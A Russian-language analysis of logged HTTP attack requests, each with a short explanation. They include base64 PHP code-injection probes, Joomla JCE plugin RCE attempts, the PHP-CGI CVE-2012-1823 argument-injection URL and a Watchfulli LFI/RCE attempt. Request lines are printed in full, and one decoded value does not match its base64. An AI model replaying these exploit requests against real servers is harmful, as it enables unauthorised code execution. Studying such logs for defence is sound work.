PHP Code Injection / Remote Code Execution (RCE)

### Запрос 1
```http
/index.php?base=1&php=ZGllKCdlZDZmMGNmNjI0M2RlOTcyZjEzZGY2N2M0MDM5NTlhZCcpOw==&ARRAY=7o2230223n313737353831313337372p2231223n22687474703n5p2s5p2s7n733836327631332r706165646r6573732r736o696r5p2s3s6p633q7368656p6p5s7368616s5s62696r675s79756r78696r675s70687026743q313737353830373737372q3033646539346333356333646463336238303663343065393838363565353463222p2232223n226532343230663963313937363136646164326166623438303563613565626264222p2233223n226437636665663266663734343266646435356338303962613839643638333963222p2262696r675s70617373223n2231352q33362q35332q36362q37312q38352q3238227q
```
Действие: параметр php содержит base64-декодированную строку die('ed6f0cf6243de972f13df67c403959ad') – проверка выполнения произвольного PHP-кода.

### Запрос 2
```http
/index.php?base=1&php=ZGllKCdjOWI4M2M2MDA0ZTA1MTJhOGY3NjA3ZjNhMTJjMDk0MycpOw==&ARRAY=... (полный URL аналогичен предыдущему, но с другим php и ARRAY)
```
Действие: то же самое – проверка выполнения PHP-кода через die('c9b83c6004e0512a8f7607f3a12c0943').

### Запрос 3
```http
/index.php?base=1&php=ZGllKCc4NGM1MTVlY2NlMzRlYWE1ODkxMWEyMWI3YzY4N2Y2MicpOw==&ARRAY=...
```
Действие: аналогично, с die('84c515ecce34eaa58911a21b7c687f62').

### Запрос 4
```http
/index.php?base=1&php=ZGllKCdkNGFjYmM3OTE5M2Y3NDJmYzFmZGFmM2E1OGQyM2I2MicpOw==&ARRAY=...
```
Действие: аналогично, с die('d4acbc79193f742fc1fdaf3a58d23b66').

### Запрос 5
```http
/index.php?option=com_jce&task=plugin.rpc&plugin=browser&d868134e526ac83eeec9028ab9d35ed0=1
```
Действие: эксплуатация уязвимости JCE (Joomla) – удалённое выполнение PHP-кода через плагин browser.

### Запрос 6
```http
/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput
```
Действие: атака на PHP-CGI (CVE-2012-1823): позволяет выполнить произвольный код через php://input.

### Запрос 7
```http
/index.php?option=com_jce&task=plugin.rpc&plugin=browser&7a568792ed240cf7d7470d180d0e55a1=1
```
Действие: ещё один вариант атаки на JCE с другим хешем.

### Запрос 8
```http
/index.php?option=com_watchfulli&format=json[TMP]l=component
```
Действие: попытка LFI/RCE через компонент Watchfulli (Joomla) с использованием [TMP].
